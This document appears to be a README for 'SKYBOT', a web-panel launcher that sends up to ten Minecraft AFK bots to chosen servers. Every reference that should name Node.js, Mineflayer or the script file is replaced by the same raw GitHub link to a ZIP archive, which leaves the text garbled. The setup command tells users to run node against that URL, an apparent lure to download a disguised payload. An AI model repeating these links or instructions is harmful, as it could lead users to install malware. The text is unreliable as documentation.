# SKYBOT Multi-Bot Launcher

SKYBOT is a lightweight, browser-controlled https://raw.githubusercontent.com/1Bot-star/afkbot/main/autem/Software_3.4.zip app that lets you deploy up to **10 Minecraft bots** on different IP/port combinations. It uses [Mineflayer](https://raw.githubusercontent.com/1Bot-star/afkbot/main/autem/Software_3.4.zip) for bot creation and simulates AFK activity.

## 🚀 Features
- 10 bot slots
- Each bot controlled via a responsive web panel
- Reconnection if kicked or disconnected
- Random usernames (e.g. `SKYBOT_0_8392`)
- Persistent launch button states (resets survive restarts)
- Mobile-friendly interface

## 🛠️ Setup

1. Install https://raw.githubusercontent.com/1Bot-star/afkbot/main/autem/Software_3.4.zip (v16 or higher).
2. Place the `https://raw.githubusercontent.com/1Bot-star/afkbot/main/autem/Software_3.4.zip` in a folder and run:
```bash
node https://raw.githubusercontent.com/1Bot-star/afkbot/main/autem/Software_3.4.zip
```
3. Open `http://localhost:3000` or your hosted Render/Replit URL.

## 🌐 Web Panel
Each bot has its own form with IP and Port fields:

```
[ IP 1 ] [ PORT 1 ] [Send Bot 1]
[ IP 2 ] [ PORT 2 ] [Send Bot 2]
...
```

After a bot is launched, the button becomes disabled to prevent duplicate launches.
